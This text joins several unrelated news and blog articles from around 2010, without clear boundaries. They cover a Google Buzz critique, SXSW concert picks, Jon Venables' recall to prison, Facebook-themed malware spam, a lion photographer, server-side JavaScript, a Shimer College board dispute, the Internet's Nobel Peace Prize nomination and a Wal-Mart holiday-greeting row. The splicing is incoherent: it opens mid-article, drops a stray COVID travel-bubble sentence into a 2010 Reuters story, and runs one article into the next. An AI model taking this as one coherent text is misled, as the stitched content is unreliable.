This is like a new house having been built without a front door ( where the above - mentioned lack of a “ Find Buzzers Among Your Contacts ” functionality is like having built a new house without running water ) .
5 ) Signing up for Picasa has to become more automatic .
Right now there are bugs and extra steps that need to be streamlined .
Google programmers should work on this all weekend .
The ability to load photo albums is critical to competing with Facebook and it is an advantage over Twitter ( which should have allowed this months ago themselves , although Twitter has amazingly held the advantage of being the one site that has been successful in allowing custom backgrounds ) .
6 ) For Google not to have provided Blogger.com integration was almost criminal ( under the Failure to Promote Your Own Company Products Act ) – but neither Facebook nor Twitter have capitalized on the idea that people still use blogging websites like WordPress.com when they might prefer to pay a premium to have in - house blogs hosted at Facebook and Twitter .
Beach landings tend to fail more often than succeed whether in war or ( metaphorically ) in business .
The reason is almost always unpreparedness for consolidating any gains and for fixing deficiencies that either appear because something breaks down temporarily or , worse , because the need for something had not been anticipated .
Most of the above six deficiencies will need to be fixed fast for Operation Google Buzz to save itself from being thrown back in the water with the loss of everyone now on the beach .
Update : Google Buzz does a great job of presenting this blog article itself –
There is more information ( with imagery ) provided than the Facebook and Twitter posts I made to attract readers .

Update : While Big Company Syndrome may prevent Google managers from even seeing this post , I had also made a critique of AddThis.com in this space because they had failed to provide a decent share button so I used Sharetoany.com instead .
Showing the flexibility of a good startup , Justin Thorp of AddThis immediately saw this article and answered below that his company will look into making AddThis more user friendly for WordPress.com users .
Watching what people are saying on the web is a great way for corporations to avoid being overtaken out of seeming nowhere .
Without companies like AddThis paying attention , industries like the Share Button “ industry ” could get another viable player .
With Google Alerts , it is n’t all that hard for a small company to keep track of mentions on the web and respond to them .
Google itself , however , is probably too big to pay attention to Google Alerts about Buzz .

AUSTIN , Texas –
The best thing about the South by Southwest music festival is the nonstop blur of bands from around the world .
Even with thousands of musicians converging on the so - called Live Music Capital of the World , it can be difficult to catch a truly transcendent show – if nothing else , the sheer volume of venues ( and the sheer volume of the bands ) can make it hard to navigate the sea of sound .
Of the dozens of shows the Wired.com team caught while at the festival , which ended Sunday , these are the bands that made the strongest impressions .
Some were on our short list of bands to check out ; others came as total surprises .
( Be sure to let us know which SXSW bands blew you away in the comments section below . )
Broken Social Scene — — — —— —-
I did n't believe the hype , but I should 've .
Like any good big-venue band , Broken Social Scene sets out to offer a transcendent concert experience , and succeeds .
Band founder Kevin Drew is the ringleader of almost a dozen musicians , directing everyone throughout the set .
At any given time there are three or four guitarists and vocalists onstage , plus keyboards and drums .
Both the sonic space and stage tend to get crowded , but the Canadian band makes it work , miraculously , achieving a sound so big and beautiful you can't help but feel your heart swell .
The songs are fresh and unique , and catching a Broken Social Scene show is akin to attending some sort of musical church .
– Keith Axline
Capsula — —-
This trio from Bilbao , Spain , brought gobs of energetic , heavy garage psyche – think Comets on Fire and The Cramps – with screamed lyrics that are sometimes English , sometimes Spanish , or maybe Basque , although you can never really tell under the haze of reverb , fuzz and crashing cymbals .
Capsula tore up Maggie Mae 's during a packed Saturday night set , with guitarist Martin Guevara literally climbing the walls , slamming his guitar against light fixtures , ledges and shelves near the stage .
Bassist Coni has mastered the art of the high - pitched rock scream .
She also wears kitty ears and pounds on her bass like it 's her little brother .
So sexy .
– Michael Calore
Dr. Dog — —-
The No. 1 term used to describe Dr. Dog is " Beatles - esque , " due to the group 's harmonies , multiple lead singers and instrumentation .
While this may be true for the band 's recordings , live Dr. Dog is kinetic , loud and aggressive .
Bass player and vocalist Toby Leaman and drummer Eric Slick lock in so tightly , they alone could put on a great show .
But guitarists Scott McMicken and Frank Elroy take the Philadelphia band to 11 as they and Leaman jump around in epic rock formations and general zaniness .
I was a fan before I saw them live but now they are a must - see band for me , up there with The Walkmen and Stephen Malkmus .
– Keith Axline
Moon Duo — —
–
Like a two - piece , stripped - down , future - dipped combination of Faust and Spacemen 3 , Moon Duo kept heads bobbing at SXSW at multiple venues with a heavy sound only partially discernible in this video of the band 's SXSW set at Cheer Up Charlie's .
Guitarist and guitar - pedal player Ripley Johnson ( also of Wooden Shjips ) coaxes monstrous tones out of his setup , which appears to include some custom - built gear ( do n't quote us on that – we did n't get a good look ) .
Second but not least , Sanae Yamada holds up her end of this Faustian pact with keyboard drones and acoustic - style drum beats , also played on a keyboard .
You probably have n't heard two people make such a delicious racket before , though those who fear the heavy sound should take warning .

Notekillers — ——
–
I happened into this gig with some friends fairly early one night , and ended up buying a CD - R and a T - shirt despite having no good way to carry the merch ( and having not bought a shirt with a logo on it in years ) .
Veteran Philadelphia- and Brooklyn - based band Notekillers is , in one sense of the word , sick .
If you 've ever tried to make music outside of the traditional tonal frameworks most of our ears are used to , without falling into the same tired tropes and frameworks , you know how hard it is to sustain that without devolving into noise .
Like snow leopards , Notekillers achieves this on a full - on , nonstop level without succumbing to noise or facile negativity – and may have even invented the concept , or at least a healthy chunk of it .
If it sounds familiar , there 's a good reason for that : Sonic Youth , and by extension half of the decent guitar bands of the past 20 years , channeled Notekillers while honing its early sound .
– Eliot Van Buskirk
Oh No Ono — ——
To make a gross generalization , older bands at SXSW who came of musical age in the Time of the Guitar have better chops than younger bands at the festival .
Not to say that the young folks can't play , or that their music is inferior , just that technical and songwriting mastery does not come easy and most folks need to put in Malcolm Gladwell 's 10,000 hours to get there .
Perhaps it says something about the Danish weather that Copenhagen 's Oh No Ono seems to have put in that kind of time despite falling on the younger side of the spectrum .
They brought not only the fresh sounds new bands need to make an impression , but also the hard - won chops some older players rely on to stay relevant .
Bonus :
The band defeated the Radiohead level with an outstanding cover of " Weird Fishes . "
– Eliot Van Buskirk
Street Sweeper Social Club — — — — — — ——
–
It ain't easy being in a supergroup .
Everybody compares you to your former bands and , depending on your new group 's pedigree , it can be difficult to live up to expectations .
Street Sweeper Social Club is fronted by former Rage Against the Machine guitarist Tom Morello and The Coup 's Boots Riley .
While Street Sweeper 's debut record dropped to mixed reviews , the band 's ferocious live set at Rusty Spurs should have left nobody questioning the new group 's power .
Humongous grooves and energy to spare had the entire room bouncing in time with the band members .
The bass overwhelmed Riley 's vocals at times , but Morello 's guitar cut through the mix and soared into the stratosphere .
And let 's be honest :
Nobody rips it up like six - string wizard Morello , whose raging solos and flamboyant performance style make him one of the most exciting guitar - slingers on the planet .

Young Prisms — — ——
As most live - music veterans know , earplugs are mandatory if you do n't want to lose the ability to hear the music you love .
This year , I even ended up wearing mine between shows , to tone down the ceaseless sonic overload of chatter and bass booming out of SXSW venues trying to attract listeners .
I kept my earplugs on during Young Prisms ' set , and loved what I heard .
See , I 'm still a sucker for the shoegaze sound , properly done , and apparently this San Francisco band is , too .
Slowdive meets Bardo Pond at New Order 's funeral – it was just the thing .
File under " antidote . "
– Eliot Van Buskirk
We Were the States — — — — ——
These guys sounded so good that they cut through the din of SXSW from 100 yards away and grabbed my ears ' attention .
We Were the States played in a tiny room in the back of Headhunters and performed like it was their debut at the Fillmore .
The jolting combination of classic and indie rock primes the band from Murfreesboro , Tennessee , for greater things .
I 've since listened to We Were the States ' recordings , and do n't think they do the band justice .
See them live and you wo n't be disappointed .

James Bulger was murdered in Liverpool in 1993
One of the killers of two - year - old James Bulger is back in prison after breaching the terms of his release , the Ministry of Justice has said .
Jon Venables , now 27 , and his friend , Robert Thompson , murdered James in Bootle , Merseyside , in 1993 .
Both killers were aged just 10 at the time .
They were given life sentences , but released in 2001 with new identities and under certain licence conditions .
The ministry did not detail the nature of Venables ' breach of his licence .
Mother 's ' anxiety '
It said in a statement : " We can confirm that Jon Venables has been recalled to custody following a breach of licence conditions .
" Offenders on licence are subject to strict conditions ; if they breach those conditions they are subject to immediate recall . "
Venables ' solicitor at the time of his trial , Laurence Lee , told the BBC : " He could have been recalled on licence if he committed an offence , it could be that he returned to Merseyside , it could be he might have approached the family .
Venables was released from custody in 2001 and given a new identity " There is no evidence so far that he did any of these things . "
Retired Det Supt Albert Kirby , who led the murder inquiry , said he was surprised Venables was back behind bars .
He added : " I 've always thought , with regards to that particular boy , that from what we 've heard over the years there was every possibility he would have avoided going back into prison . "
A relative of Denise Fergus , James 's mother , said the family had no plans to comment on Venables ' return to prison at this time .
But Mr Kirby told BBC
News he had spoken to James 's mother and the news had brought " a whole load of anxiety " back to her .
He said : " There 's always been a lot of anxiety as to where both boys are .
Please turn on JavaScript .
Media requires JavaScript to play .
" To hear something like that this evening ; it brings back to her a lot of the concerns , quite understandably , that she and any other parents in these sorts of circumstances would have . "
' Unparalleled barbarity '
On 13 February 1993 , Venables and Thompson abducted James from a shopping centre in Bootle and killed him on a railway line .
A week - long appeal followed , with CCTV footage being released of the little boy holding the hand of one of his killers as he was led out of the Strand shopping centre .
ANALYSIS Dominic Casciani , BBC News
When Jon Venables walked out of prison in 2001 , it was not as a free man .
His release came because the Parole Board decided the public would be safe if he were allowed into the community on a licence that includes strict conditions .
A criminal 's recall to prison is triggered by one of three circumstances .
He either committed a crime , showed the signs that he was about to , or breached specific conditions imposed .
Breaches can be technical , such as being out of the home at the exact start of a curfew , or far more serious , such as contacting a victim 's family .
Venables will be told why he is back inside and he can seek a full oral hearing before the Parole Board .
But with public protection being the top priority , the panel will start with the case for keeping him inside , rather than the argument for letting him out .
The toddler had been approached and befriended by the two boys while his mother was in a shop .
James 's body was found by children playing on a freight railway line near Walton Lane police station .
He had been beaten to death with bricks and an iron bar .
The 10 - year - old killers were arrested days later and became the youngest to be charged with murder in the 20th Century .
Eight months later they were convicted following a 17 - day trial at Preston Crown Court and ordered to be detained at Her Majesty 's pleasure .
Trial judge Mr Justice Morland told the pair they had committed a crime of " unparalleled evil and barbarity " .
In 1999 the European Court of Human Rights decided they should not have been tried in an adult court .
Despite public outcry , two years later the parole board recommended their release as they " were no longer a danger to society " .
More than 300,000 people signed a petition saying the sentence of eight years was too short .
Both Thompson and Venables were given new identities when they were released .
An order prohibiting the publication of details which could reveal their whereabouts has remained in place since their release .

OFFPO REUTERS / Catherine Benson
BOSTON ( Reuters ) - Hackers have flooded the Internet with virus - tainted spam that targets Facebook ’s estimated 400 million users in an effort to steal banking passwords and gather other sensitive information .
The emails tell recipients that the passwords on their Facebook accounts have been reset , urging them to click on an attachment to obtain new login credentials , according to anti-virus software maker McAfee Inc .
If the attachment is opened , it downloads several types of malicious software , including a program that steals passwords , McAfee said on Wednesday .
Hackers have long targeted Facebook users , sending them tainted messages via the social networking company ’s own internal email system .
With this new attack , they are using regular Internet email to spread their malicious software .
Facebook could not be immediately reached for comment .
McAfee estimates that hackers sent out tens of millions of spam across Europe , the United States and Asia since the campaign began on Tuesday .
Dave Marcus , McAfee ’s director of malware research and communications , said that he expects the hackers will succeed in infecting millions of computers .
“ With Facebook as your lure , you potentially have 400 million people that can click on the attachment .
If you get 10 percent success , that ’s 40 million , ” he said .
The email ’s subject line says “ Facebook password reset confirmation customer support , ” according to Marcus .
As the number of COVID cases continues to drop in Australia , there 's suddenly a whole lot more talk again about travel bubbles and increasing international arrivals from " safe " coronavirus countries .

Photographer captures amazing images of lions after submerging himself in watering hole for three months
Advertisement
Wildlife photographer Greg du
Toit was so determined to capture the perfect image of wild lions drinking he sat submerged in their watering hole for three months .
The defiant photographer had endured a year of failed attempts at getting the right picture after building hides and digging trenches near the animals ' drinking spot .
In a final desperate effort , the 32 - year - old decided to take the plunge and climb into the murky pool with his camera and ended up contracting several tropical diseases .
Determined : Greg du
Toit 's persistence paid of as he captured this image of two lionesses venturing to the pool in search of a drink of water
He began a long - term waiting game where he sat semi-submerged for 270 hours to get the big cats on film .
But as these never - before - seen pictures show , his hard work - three hours per day for seven days a week in the water - was definitely worth the wait .
It came at a huge price for the photographer who was diagnosed with Bilharzia and contracted several parasites which he soaked up through the dirty water in the drinking hole .
Unique : A family of warthogs cool off at the pool in the Nguruman Hills , Kenya , as Mr du Toit looks on
Pride :
These lions were only a leap away from Mr du Toit and were aware that there was something in the pool
Mr du Toit was also diagnosed with deadly malaria twice after contracting it through mosquitoes breeding in the pool .
Green and feeling sick from his ordeal , the South African visited doctors who were shocked at seeing the worst test results they had ever recorded .
' The doctors panicked when they noticed that my red blood platelet count was sky high , ' Mr du Toit said .
' The first real symptom was blood in my urine , which is when I went for blood tests .
The blood test confirmed that I had Bilharzia .
' It 's caused by a type of flatworm which had spent part of its life in water snails and the other part in my liver .
It left me weak and in bed for weeks . '
He added : ' The high red blood platelet count signalled that I was carrying a lot of parasites .
This included numerous species of internal worm parasites and a particularly nasty external worm parasite known as Hook Worm .
' This worm was actually visible under the skin of my foot and would move at night .
It became a game to find the worm in my foot each morning .'
After a long stint sick in bed recovering , Mr du Toit was finally given the all clear following courses of powerful antibiotics , pesticides and by spraying liquid nitrogen on the parasites visible under his skin .
Determined : Mr du Toit , 32 , decided to climb into the pool after several failed attempts to capture lions at the pool .
His efforts saw him contract Bilharzia , malaria twice and several parasites - and land a spot in the March edition of BBC Wildlife magazine
The photographer , who was living in south Kenya 's Great Rift Valley , was then able to enjoy the fruits of his labour .
His stunning images captured at the watering hole in the Nguruman Hills in Kenya , three miles from the closest Masai village , give a rare and powerful insight into the lives of lions .
And during his several weeks spent with only his head - and - shoulders above water , Greg also managed to capture several other African species making their visits to the beauty spot for a refreshing drink .
One spectacular picture , taken from Greg 's unique ' frog 's eye view ' , shows two lionesses lapping gracefully at the 20 sq metre pool 's edge .
Another shows a whole pride of lions joining in the watery action as they cool off only metres from watchful Greg who was just ' one leap away ' from the colossal predators .
' There were times when I was shaking with so much with fear I had to stop what I was doing and breathe to get myself calm .
' I had to get the camera steady so I could get the pictures I had waited so long for , ' he said .
' The lions knew there was something in the water but we think they only recognise humans when they are upright on legs so they took little notice of me and my camera . '
Mr du Toit also captured zebras , warthogs , baboons and much of Africa 's huge variety of birdlife in his stunning images .
He added : ' It was worth it 100 per cent and I would do it all again , worms and all . '
The photographs will feature in the March issue of the BBC Wildlife Magazine .

In the past few months a new meme seems to be very vibrant in the world of web - development : server - side Javascript .
The idea certainly is n't new - Netscape had offered JS on the server - side sometime in the 1990s .
Since then , powerful dynamic languages like PHP , Python and Ruby along with Java and ASP have taken over the server - side development scene .
So what has happened recently to stir the balance ?
It 's hard to tell , I can only guess :
Javascript is growing in popularity as more and more powerful applications get written in it to run in the browser .
This increases the amount of programmers interested in it , as well as the total amount of Javascript code out there in the wild .
A zoo of new and powerful implementations has appeared recently .
A real arms race between Google 's V8 , Mozilla 's TraceMonkey and WebKit 's Squirrelfish boosted the performance of Javascript engines considerably in the past couple of years .
The first reason , in particular , is very important .
These days a web - developer has to constantly switch between two programming languages - Javascript for the client , and his server - side language of choice for the server .
Many people started feeling that this is a useless split of attention , and using a single language both for the client and the server is a good idea .
Why it 's bad First of all , further fragmentation of the server - side development community .
Are n't there enough ways to write web - applications as it stands ?
Multiple languages to choose from , multiple frameworks to use once you 've chosen a language .
Do we need another language & platform for server - side development ?
What 's so bad with having two tools , each suitable for its domain ?
The other reason I see is more controversial .
Javascript is far from being an ideal language .
While it has a good core in it , there are also a lot of quirks and design faults .
Oh , and there 's a ton of horrible code out there that just gets copy - pasted from project to project .
I 'll stop here since I do n't want to turn this post into a language flame - war , but I 'll do say that I 'd prefer coding in Python or Ruby over Javascript , and thus it 's disturbing that Javascript starting to take a share of the server - side cake .
Why it 's good Just as the rise in popularity of JS in the browser brought us faster engines that make the internet experience more pleasant , I think that examining new approaches is generally healthy .
There 's a lot of excitement around this issue lately - excitement that brings talented developers in , places them in the zone for productive hacking , and overall provides a fresh perspective on things .
For example , one of the most exciting tools in this scene is Node.js .
It 's a Javascript interpreter built on top of V8 .
What 's really cool about Node.js is that it 's completely event - based , designed and tuned for asynchronous non-blocking I/O .
Asynchronous non-blocking I / O seems to be all the rage recently , as it was found to be greatly enhancing the performance of servers , allowing to handle huge loads of concurrent connections within a single process , without using threads .
This approach is n't new .
Twisted is a venerable and powerful event I/O library for Python , for example .
However , when you code with Twisted you have to be careful to use only very specific Python modules - use one that is blocking and you 've ruined the whole model .
Node.js , on the other hand , comes with its own standard library that was designed from the ground - up to be 100 % non-blocking .
It 's only fair to note that in this area of event - based programming , Javascript actually has an advantage .
The language 's simple built - in way of creating anonymous functions is very helpful in this aspect .
As a matter of fact , everyone who 's written AJAX code and has used a library like jQuery ( which these days covers a high percentage of serious JS developers ) , is already used to the event model of programming .
AJAX is all about asynchronous events for which you register an anonymous callback function to handle the result when it arrives .
Node.js is n't the only general - purpose implementation of Javascript suitable for server - side development .
Mozilla 's Java - based Rhino is an alternative , and there are many others .
As expected , we can see a lot of fragmentation between the communities since Javascript does n't even have a commonly accepted standard library .
Recent projects like CommonJS come to fix this situation , however .
On yet another hand , making one process run as fast as possible is a lofty goal , but what about true parallel programming ?
Event loops such as the ones offered by Node .js do n't scale to multi-CPU machines , so I wonder how this situation will be handled .
My bet would be on relatively independent processes communicating via message - passing and talking to mutual data stores via TCP .

The last time I checked in with Shimer College , late last year , the tiny , fiercely independent Great Books school was embroiled in a battle over what some saw as a right - wing attempt to take over its board and administration .
That battle is still raging , with a couple new developments : a " first step " toward creating a politically conservative college within the Shimer shell and the revelation of a financial nexus that appears to be funding controversial changes .
This semester , for the first time , Shimer is offering a class called " The Morality of Capitalism , " devised and taught by new adjunct faculty member Marsha Familaro Enright along with Shimer professor James Donovan .
Enright announced the class in December on the Web site of the Reason Individualism Freedom Institute , described as " the foundation for the College of the United States . "
She also noted there that she landed the teaching gig after she was referred to Shimer 's new president , Thomas Lindsay , a Bush - era deputy chair of the National Endowment for the Humanities , by Herbert Walberg , chairman of the " free- market " think tank the Heartland Institute .
Enright wrote , " When I conceived this ambitious project five years ago , skeptics — even close friends — insisted that the notion of starting a new college from scratch was crazy or impossible .
. . .
Now , despite the naysayers , we 're well on our way .
" Following what I anticipate will be a successful ' test run ' with this course , we 're aiming to expand our relationship and develop a dedicated institute to operate The College within Shimer .
" We will offer selections from the College of the United States curriculum to students of Shimer and [ the Illinois Institute of Technology ] .
Then we 'll proceed toward our goal of establishing the College of the United States as a full - time , accredited institution of higher learning . "
Enright argues that a new college is needed because " ignorance , anemic reasoning skills , and collectivist ideas are pervasive in higher education " and only " those trained in the art of objective reasoning , and certain of its grounding in what 's true and right , can effectively combat this plague . "
The College of the United States will offer a " curriculum that demonstrates the virtues of Western culture , capitalism , and markets . "
According to Enright , that curriculum will use the Great Books and Socratic seminars , as Shimer does , while also extending the " Montessori concept of education up to the college level . "
She says her motives are educational rather than political .
But Daniel Merchán — a Shimer alum , class of 2009 — says he and others are " increasingly angry at the autocratic direction that the president and the stacked half of the board seem to be taking . "
Board membership has more than doubled in the last couple of years and many of the newcomers are affiliated with politically right - leaning groups .
Merchán says he became particularly interested in the Heartland Institute , which is run by one of those new members , Joseph Bast , when he noticed a headline reading " Tired of Political Correctness ? " on an ad for Shimer in a newsletter published by Heartland .
According to Merchán , no one he spoke with in the Shimer administration , faculty , or student body was aware of the ad .
Looking into Heartland 's funding , he found through the Web site of the Media Matters Action Network that the Barbara and Barre Seid Foundation is one of Heartland 's principal donors , and something else : " I discovered [ that the Seid Foundation gave ] Shimer College $ 650,000 in 2007 , " Merchán notes .
Shimer moved from Waukegan to IIT 's south - side campus in 2006 with the help of a big pledge from an anonymous donor .
The school did n't report a gift from the Seid Foundation , Merchán says , but did report an anonymous contribution of $ 750,000 in 2007 .
Although Merchán can't account for the extra $ 100,000 ( he says it could 've come from the same source through a third - party organization like the Donors Trust ) , the single large donation got him thinking that Seid , a local businessman and philanthropist , might be Shimer 's mystery benefactor .
Then he took a closer look at the long list of other Seid Foundation grants .
They included a total of $ 660,575 to the Palmer R. Chitester Fund in 2004 and 2005 , $ 500,000 to congregation Shaare Tikvah B'nai Zion in 2006 and 2007 , $ 740,000 to U.S. Term Limits between 1998 and 2000 , and more than $ 3 million to George Mason University between 1998 and 2006 .
Chitester Fund head Bob Chitester joined the Shimer board in 2009 .
So did Shaare Tikvah B'nai Zion rabbi Dennis Katz , U.S. Term Limits cofounder Eric O'Keefe , and George Mason official F.H. Buckley .
Barre Seid — who Merchán says is n't a Shimer alum and has n't been on the board or given the school a donation in his own name — heads Chicago - based Trippe Manufacturing and Michigan City 's Fiber Bond Corporation .
Trippe CFO / COO
Charles Lang joined the Shimer board in 2008 , as did Fiber Bond president John Marienau .
That was also the year Heartland 's Bast joined .
Seid did n't return calls for this story , and a Shimer spokesman said this week that " none of the administrative staff or board members are taking interview requests at this point . "
But Bast did comment , saying that if there 's an attempt to change the school " I think it 's an attempt to return to the mission . "
He added , " Many of the trustees are involved in philanthropy . . . so we have a lot of donors in common .
And that 's not a conspiracy . "
After another five people with no previous connection to Shimer were added to the board last fall , some longer - term board members pulled together an all - alumni slate of candidates to fill the remaining available spots .
( The board now has an official limit of 40 . )
But this slate was tabled by the nominating committee , which Merchán says is dominated by allies of the president .
Merchán maintains it 's the only time in recent Shimer history that a group of qualified nominees has been blocked .
Shimer has a tradition of participatory governance by an assembly that includes students , faculty , trustees , and staff .
This month , in response to the president 's professed intention to change the school 's mission statement , both the assembly and the faculty , meeting separately , voted to keep the current statement intact .
But at a board meeting February 20 — while students and alumni stood outside in protest — Lindsay 's new mission statement was adopted .
The old one had dedicated Shimer to " education for active citizenship in the world . "
The new text drops those words and declares instead , " Shimer 's cultivation of free minds simultaneously transcends and depends on the political freedom enshrined in the American Constitution . "
Last year , the Norwegian Nobel Committee caused quite a stir when it pegged President Obama as the winner of the Nobel Peace Prize .
Well I am sure the blogosphere and editorial pages will be abuzz if they award the prestigious prize to the Internet this year .
That ’s right , according to the Associated Press , that inanimate global network of computers that brought you stupid pet trick videos , time - wasting video games and spam e-mail has been nominated for the Nobel Peace Prize .
While the nominees for the Nobel Prize each year – a long list of mostly worthy individuals submitted by parliamentarians from around the world , previous award winners and academics – are kept secret , nominators sometimes spread the word about their candidate .
The Italian edition of the digital culture magazine Wired launched a campaign to nominate the Internet for the Peace Prize last year , including a web site , www.internetforpeace.org.
Celebrities like fashion designer Giorgio Armani and technology luminaries like Joi Ito of Creative Commons and Nicholas Negroponte of the MIT Media Lab signed on as ambassadors of the cause .
But it was not until they won the support of Iranian human rights activist and Peace Prize winner Shirin Ebadi that the nomination was clinched .
In her declaration about the nomination , Ebadi recognizes the power of the Internet to unite people in the cause of peace .
But she notes that “ [ the ]
Internet can also be used for propaganda of war and terrorism ’s attacks , as Taliban and some other terrorist groups have used the Internet to attract many fans …
Therefore , it should be considered that the Internet is a device .
If it will be used for the peace then it can create friendships and if it will be used in a way that teaches making bombs , then it may be a means of communication for people who are demanding war . ”
Thus the controversy .
What exactly is the Nobel Peace Prize recognizing ?
Is the prize for the grassroots peacemakers , pragmatic diplomats or contemplative visionaries ?
Ironically perhaps , Alfred Nobel ’s wealth came from his invention of dynamite and the resulting increase in the killing potential of war - making .
Nobel basically got rich from bombs .
He then left the vast majority of that wealth in a trust to fund the awards that bear his name , including the Peace Prize , which was first awarded in 1901 .
The prize has always been controversial and political .
Mohandas Gandhi , the recognized father of 20th century nonviolence and leader of the Indian independence movement , never received the prize .
Henry Kissinger did .
Go figure .
Nelson Mandela received the prize , but he had to share the honor with apartheid leader Frederik Willem de Klerk ( maybe because he did n’t engage in genocide when faced with the dissolution of his racist regime ) .
It ’s not likely that the Internet will be announced the winner this October ( it ’s not clear if inanimate objects are even eligible ) , but perhaps it is just as reasonable a choice as any other .
The Nobel Peace Prize is meant to honor “ the person who shall have done the most or the best work for fraternity between nations , for the abolition or reduction of standing armies and for the holding and promotion of peace congresses . ”
But the prize has gone to environmental activists , human rights workers , grassroots activists and others who seem not to fit the description … at least not narrowly defined .
The naming of Obama for the award last year resurfaced long - standing controversies over the award .
Had the newly elected U.S. president earned the accolade ?
Obama , who said he was surprised and humbled by the honor , also admitted that the award was more “ a call to action ” than an award for accomplishments .
Maybe the same could be said for the Internet .
For most of us , the Internet is just a tool for communications , a source of distraction or entertainment .
But the potential is there for the Internet to truly transform the world .
In fact , it is already happening .
Nearly 2 billion people are online , representing every continent , language , religion , race and belief .
For the first time in history , the people of the world are just a mouse - click away from one another .
And activists have taken to the Internet as the tool and terrain for new progressive political movements .
The Internet is , in the words of the Internet for Peace manifesto ,
“ much more than a network of computers .
It is an endless web of people .
Men and women from every corner of the globe are connecting to one another , thanks to the biggest social interface ever known to humanity .
Digital culture has laid the foundations for a new kind of society .
And this society is advancing dialogue , debate and consensus through communication .
Because democracy has always flourished where there is openness , acceptance , discussion and participation .
And contact with others has always been the most effective antidote against hatred and conflict .
That ’s why the Internet is a tool for peace .
That ’s why anyone who uses it can sow the seeds of non-violence . ”
Now that is a call to action .

We may be two peoples separated by a common language , as Shaw once suggested , but the US propensity to find teeth - grindingly literal explanations for the world around us never ceases to cause the British mirth .
The caricature of a fearful United States where every I must be dotted , and every T must be crossed , where coffee cups warn the the user of hot liquids inside , and where blogs are tattooed with incomprehensible license terms , is n't just the stuff of myth , however .
This nit -picking has become the foundation of the nation , one that pitches the established class of nit-pickers ( the lawyers ) against a new breed of nit-pickers ( the technocrats ) .
But few stories illustrate this derangement are well as the bizarre - but true - story we bring you here .
Bear with us .
The United States takes the separation of church and state ( and body and mind ) with a scary earnestness , so although it 's nominally a Christian country , the Christian time of celebration is formally celebrated through a complicated euphemism .
Here , it 's called " the Holiday Season " .
Is n't that a tautology ?
Hush for a moment .
Being the land of untrammeled commerce , this also throws up a few anomalies .
For example , the uptown department store Macy 's currently offers what the British call Christmas Trees ( here they 're called " Holiday Decorations " ) in a variety of pre-themed categories such as the South Park™ - theme and the Barbi™ - theme .
But we digress .
In a sphincters - held - tight culture such as this , little things mean a lot , so when the giant US big box retailer Wal - Mart recently changed a greeting from " Merry Christmas ! " to " Happy Holidays ! " it drew complaints .
And here the troubles began .
The emails duly arrived , and a customer - facing rep took it on herself to explain the change with this ill - advised exhibition of learning .
The employee , who we know only as Kirby , launched into a fantastically earnest historical explanation of what the Christmas Holiday Season™ really meant .
" Christmas is actually a continuation of the Siberian shaman and Visigoth traditions , " Kirby replied .
" Santa is also borrowed from the [ Caucasus ] , mistletoe from the Celts , yule log from the Goths , the time from the Visigoth and the tree from the worship of Baal .
It is a wide wide world , " the helpful Kirby replied , making sure every I was dotted and every T crossed .
All of which is true , but as you can imagine , these were n't exactly the soothing words the complainer wanted to hear .
The Wal - Mart punter simply wanted a reassuring pat , a promise that this sudden switch from religious to secular , did n't actually mean aliens had landed .
And she got fairly firm confirmation that aliens had not only landed , but - Worship of Baal ??
- actually had their scaly alien tentacles manning the tills .
Yikes !
What 's a god - fearing literalist to do , except call out the fire brigade ?
In this instance , it arrived in the form of Catholic League demagogue Bill Donohue .
A boycott was duly summoned , Wal - Mart relented , and heads rolled .
Kirby is no longer an Wal - Mart employee , we learn , which is a shame , as in her own painfully literal ( and right - on ) way , she was only trying to be helpful .
In a flash , the two worlds just shot past each other .
Integrating cultures is always messy , but it 's far from impossible , as the successes have proved .
France 's most notoriously " Arab " city , the port of Marseilles , escaped the recent riots unscathed and in Manchester , England the fireworks that mark Eid , the end of Ramadan , are celebrated by everyone .
As is Christmas .
The idea of a party seems to be universally understood - and when it is , recourse to weird schematas or diagrams simply does n't occur to anyone as an option , thankfully .
We just need to loosen a few sphincters , but the USA is a tense place these days . ®
